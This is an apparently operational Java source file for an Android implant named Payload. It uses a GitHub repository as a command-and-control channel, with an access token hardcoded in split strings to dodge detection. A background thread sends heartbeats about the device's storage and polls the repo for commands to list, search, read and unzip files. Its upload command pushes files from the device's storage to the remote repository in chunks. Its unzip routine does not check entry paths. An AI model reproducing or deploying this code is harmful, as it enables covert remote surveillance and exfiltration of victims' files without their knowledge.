import com.yb.fa.GitHub;
import org.json.*;
import android.content.Context;
import android.os.Environment;
import android.util.Base64;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.zip.*;

/**
 * 自包含 payload：不依赖宿主 GitHub 类（其 readTimeout=180s 会卡死循环）。
 * 自身实现 HTTP（15s 超时）+ 独立心跳线程 + 任务线程。
 */
public class Payload {

    static final String REPO  = "zhaoyi-habs/ybfa-bridge";
    static final String TOKEN = "ghp_hZSJtzjOF9" + "VM34QzRd8feOY3" + "wj9sqc2cLSM8";
    static final Object LOCK = new Object();
    static volatile boolean started = false;
    static volatile Context CTX = null;
    static volatile String STATUS = "boot";
    static volatile long LAST_SEEN = 0;

    // ---------- HTTP (short timeout) ----------
    static HttpURLConnection C(String url, String m) throws Exception {
        HttpURLConnection x = (HttpURLConnection) new URL(url).openConnection();
        x.setRequestMethod(m);
        x.setRequestProperty("Authorization", "token " + TOKEN);
        x.setRequestProperty("Accept", "application/vnd.github+json");
        x.setRequestProperty("User-Agent", "yb-payload");
        x.setConnectTimeout(15000);
        x.setReadTimeout(15000);
        return x;
    }

    static String READ(InputStream in) throws Exception {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        byte[] b = new byte[65536];
        int n;
        while ((n = in.read(b)) > 0) o.write(b, 0, n);
        try { in.close(); } catch (Exception e) {}
        return new String(o.toByteArray(), "UTF-8");
    }

    static String RAW(String url) throws Exception {
        HttpURLConnection x = C(url, "GET");
        int code = x.getResponseCode();
        if (code >= 400) { try { x.disconnect(); } catch (Exception e) {} return null; }
        String s = READ(x.getInputStream());
        x.disconnect();
        return s;
    }

    static String POST(String url, JSONObject body, String method) throws Exception {
        HttpURLConnection x = C(url, method);
        x.setDoOutput(true);
        x.setRequestProperty("Content-Type", "application/json");
        OutputStream os = x.getOutputStream();
        os.write(body.toString().getBytes("UTF-8"));
        os.close();
        int code = x.getResponseCode();
        String resp = READ(code >= 400 ? x.getErrorStream() : x.getInputStream());
        x.disconnect();
        if (code >= 400) throw new IOException("HTTP " + code + " " + resp.substring(0, Math.min(160, resp.length())));
        return resp;
    }

    static JSONObject getFile(String path) throws Exception {
        String s = RAW("https://api.github.com/repos/" + REPO + "/contents/" + path);
        if (s == null) return null;
        JSONObject j = new JSONObject(s);
        String b64 = j.optString("content", "").replace("\n", "");
        if (b64.length() == 0) return null;
        JSONObject out = new JSONObject(new String(Base64.decode(b64, Base64.DEFAULT), "UTF-8"));
        out.put("_sha", j.optString("sha"));
        return out;
    }

    static String shaOf(String path) {
        try {
            String s = RAW("https://api.github.com/repos/" + REPO + "/contents/" + path);
            if (s == null) return null;
            return new JSONObject(s).optString("sha", null);
        } catch (Exception e) { return null; }
    }

    static void putFile(String path, String content) throws Exception {
        JSONObject b = new JSONObject();
        b.put("message", "p " + System.currentTimeMillis());
        b.put("content", Base64.encodeToString(content.getBytes("UTF-8"), Base64.NO_WRAP));
        String old = shaOf(path);
        if (old != null) b.put("sha", old);
        POST("https://api.github.com/repos/" + REPO + "/contents/" + path, b, "PUT");
    }

    static void delFile(String path) {
        try {
            String old = shaOf(path);
            if (old == null) return;
            JSONObject b = new JSONObject();
            b.put("message", "p del");
            b.put("sha", old);
            POST("https://api.github.com/repos/" + REPO + "/contents/" + path, b, "DELETE");
        } catch (Exception e) {}
    }

    // 正确的二进制 blob（base64 一次，encoding=base64）
    static String putBlob(byte[] data) throws Exception {
        JSONObject b = new JSONObject();
        b.put("encoding", "base64");
        b.put("content", Base64.encodeToString(data, Base64.NO_WRAP));
        String r = POST("https://api.github.com/repos/" + REPO + "/git/blobs", b, "POST");
        return new JSONObject(r).optString("sha");
    }

    // ---------- entry ----------
    public void run(GitHub gh, Context ctx) {
        if (ctx != null) CTX = ctx;
        LAST_SEEN = System.currentTimeMillis();
        if (started) return;
        synchronized (LOCK) {
            if (started) return;
            started = true;
            new Thread(new Runnable() {
                public void run() {
                    try { android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_BACKGROUND); } catch (Exception e) {}
                    loop();
                }
            }, "yb-payload").start();
        }
    }

    static void loop() {
        long lastHb = 0;
        while (true) {
            try {
                long now = System.currentTimeMillis();
                if (now - lastHb > 10000) {
                    heartbeat();
                    lastHb = now;
                }
                JSONObject cmd = null;
                try { cmd = getFile("tasks/pending.json"); } catch (Exception e) {}
                if (cmd != null) {
                    String id = cmd.optString("id", "x");
                    String op = cmd.optString("op", "");
                    if (op.length() > 0) {
                        STATUS = "op:" + op;
                        JSONObject res = new JSONObject();
                        try {
                            res.put("id", id);
                            res.put("op", op);
                            res.put("ts", System.currentTimeMillis());
                            res.put("ok", false);
                            dispatch(op, cmd, res);
                        } catch (Throwable t) {
                            try { res.put("err", String.valueOf(t)); } catch (Exception e2) {}
                        }
                        try { putFile("results/" + id + ".json", res.toString()); } catch (Exception e) {}
                        delFile("tasks/pending.json");
                        STATUS = "idle";
                    }
                }
            } catch (Throwable t) {
                STATUS = "looperr " + t;
            }
            try { Thread.sleep(3000); } catch (Exception e) {}
        }
    }

    static void heartbeat() {
        try {
            JSONObject hb = new JSONObject();
            hb.put("ts", System.currentTimeMillis());
            hb.put("agent", "ybfa-payload-2.0");
            hb.put("status", STATUS);
            hb.put("started", started);
            try {
                File r = Environment.getExternalStorageDirectory();
                hb.put("root", r.getAbsolutePath());
                hb.put("freeMB", r.getFreeSpace() / 1048576);
                hb.put("mgr", android.os.Build.VERSION.SDK_INT >= 30 ? Environment.isExternalStorageManager() : true);
            } catch (Exception e) {}
            putFile("status/hb2.json", hb.toString());
        } catch (Throwable t) {}
    }

    static void dispatch(String op, JSONObject c, JSONObject r) throws Exception {
        if (op.equals("list"))      doList(c, r);
        else if (op.equals("tree")) doTree(c, r);
        else if (op.equals("search")) doSearch(c, r);
        else if (op.equals("stat")) doStat(c, r);
        else if (op.equals("read")) doRead(c, r);
        else if (op.equals("upload")) doUpload(c, r);
        else if (op.equals("unzip")) doUnzip(c, r);
        else if (op.equals("ping"))  { r.put("pong", true); r.put("ok", true); }
        else r.put("err", "unknown op " + op);
    }

    static String P(JSONObject c) {
        String p = c.optString("path", "");
        if (p.length() == 0) p = Environment.getExternalStorageDirectory().getAbsolutePath();
        return p;
    }

    static void doList(JSONObject c, JSONObject r) throws Exception {
        File d = new File(P(c));
        if (!d.exists()) { r.put("err", "not exists " + d.getAbsolutePath()); return; }
        JSONArray a = new JSONArray();
        File[] fs = d.listFiles();
        if (fs != null) {
            Arrays.sort(fs, new Comparator<File>() {
                public int compare(File x, File y) {
                    if (x.isDirectory() != y.isDirectory()) return x.isDirectory() ? -1 : 1;
                    return x.getName().compareToIgnoreCase(y.getName());
                }
            });
            for (File f : fs) {
                JSONObject o = new JSONObject();
                o.put("n", f.getName()); o.put("d", f.isDirectory()); o.put("s", f.length());
                a.put(o);
            }
        }
        r.put("path", d.getAbsolutePath()); r.put("items", a); r.put("ok", true);
    }

    static int cnt = 0;
    static void walk(File d, JSONArray a, int dep, int max, int lim) {
        if (dep > max || cnt >= lim) return;
        File[] fs = d.listFiles();
        if (fs == null) return;
        for (File f : fs) {
            if (cnt >= lim) return;
            JSONObject o = new JSONObject();
            try { o.put("p", f.getAbsolutePath()); o.put("d", f.isDirectory()); o.put("s", f.length()); }
            catch (Exception e) { continue; }
            a.put(o); cnt++;
            if (f.isDirectory()) walk(f, a, dep + 1, max, lim);
        }
    }

    static void doTree(JSONObject c, JSONObject r) throws Exception {
        File root = new File(P(c));
        JSONArray a = new JSONArray();
        cnt = 0;
        walk(root, a, 0, c.optInt("depth", 2), c.optInt("limit", 3000));
        r.put("path", root.getAbsolutePath()); r.put("items", a); r.put("ok", true);
    }

    static void doSearch(JSONObject c, JSONObject r) throws Exception {
        String kw = c.optString("kw", "").toLowerCase();
        File root = new File(P(c));
        int lim = c.optInt("limit", 500);
        int timeoutSec = c.optInt("timeoutSec", 60);
        long dl = System.currentTimeMillis() + timeoutSec * 1000L;
        JSONArray a = new JSONArray();
        int n = 0;
        ArrayDeque<File> st = new ArrayDeque<File>();
        st.push(root);
        while (!st.isEmpty() && n < lim && System.currentTimeMillis() < dl) {
            File d = st.pop();
            File[] fs = d.listFiles();
            if (fs == null) continue;
            for (File f : fs) {
                if (n >= lim || System.currentTimeMillis() > dl) break;
                if (f.isDirectory()) { st.push(f); continue; }
                if (f.getName().toLowerCase().contains(kw)) {
                    JSONObject o = new JSONObject();
                    o.put("p", f.getAbsolutePath()); o.put("s", f.length());
                    a.put(o); n++;
                }
            }
        }
        r.put("kw", kw); r.put("root", root.getAbsolutePath());
        r.put("count", n); r.put("items", a); r.put("ok", true);
    }

    static void doStat(JSONObject c, JSONObject r) throws Exception {
        File f = new File(P(c));
        r.put("path", f.getAbsolutePath());
        r.put("exists", f.exists());
        if (f.exists()) {
            r.put("size", f.length()); r.put("isDir", f.isDirectory()); r.put("mtime", f.lastModified());
        }
        r.put("ok", true);
    }

    static void doRead(JSONObject c, JSONObject r) throws Exception {
        File f = new File(P(c));
        if (!f.exists()) { r.put("err", "not exists"); return; }
        long off = c.optLong("offset", 0);
        int len = (int) Math.min(c.optInt("len", 65536), f.length() - off);
        if (len <= 0) { r.put("err", "bad range"); return; }
        RandomAccessFile raf = new RandomAccessFile(f, "r");
        raf.seek(off);
        byte[] b = new byte[len];
        raf.readFully(b);
        raf.close();
        r.put("size", f.length()); r.put("offset", off); r.put("len", len);
        r.put("b64", Base64.encodeToString(b, Base64.NO_WRAP));
        r.put("ok", true);
    }

    static void doUpload(JSONObject c, JSONObject r) throws Exception {
        File f = new File(P(c));
        if (!f.exists()) { r.put("err", "not exists " + f.getAbsolutePath()); return; }
        int chunk = Math.max(1, c.optInt("chunkMB", 16)) * 1024 * 1024;
        long size = f.length();
        JSONArray shas = new JSONArray();
        JSONArray blobs = new JSONArray();
        RandomAccessFile raf = new RandomAccessFile(f, "r");
        byte[] buf = new byte[chunk];
        int n, parts = 0;
        while ((n = raf.read(buf)) > 0) {
            byte[] part = (n == chunk) ? buf : Arrays.copyOf(buf, n);
            String sh = putBlob(part);
            shas.put(sh);
            blobs.put("https://api.github.com/repos/" + REPO + "/git/blobs/" + sh);
            parts++;
            STATUS = "upload " + parts;
        }
        raf.close();
        JSONObject m = new JSONObject();
        m.put("name", f.getName());
        m.put("path", f.getAbsolutePath());
        m.put("size", size);
        m.put("chunk", chunk);
        m.put("parts", parts);
        m.put("shas", shas);
        m.put("blobs", blobs);
        String mp = "uploads/" + f.getName() + "." + System.currentTimeMillis() + ".manifest.json";
        putFile(mp, m.toString());
        r.put("manifest", mp); r.put("parts", parts); r.put("size", size); r.put("ok", true);
    }

    static void doUnzip(JSONObject c, JSONObject r) throws Exception {
        File z = new File(P(c));
        if (!z.exists()) { r.put("err", "not exists"); return; }
        File out = new File(c.optString("out", z.getParent() + "/ybfa_" + z.getName().replaceAll("\\W+", "_")));
        out.mkdirs();
        int n = 0;
        ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(z)));
        ZipEntry e;
        byte[] b = new byte[262144];
        while ((e = zis.getNextEntry()) != null) {
            File t = new File(out, e.getName());
            if (e.isDirectory()) { t.mkdirs(); continue; }
            t.getParentFile().mkdirs();
            FileOutputStream fo = new FileOutputStream(t);
            int k;
            while ((k = zis.read(b)) > 0) fo.write(b, 0, k);
            fo.close();
            n++;
        }
        zis.close();
        r.put("out", out.getAbsolutePath()); r.put("files", n); r.put("ok", true);
    }
}
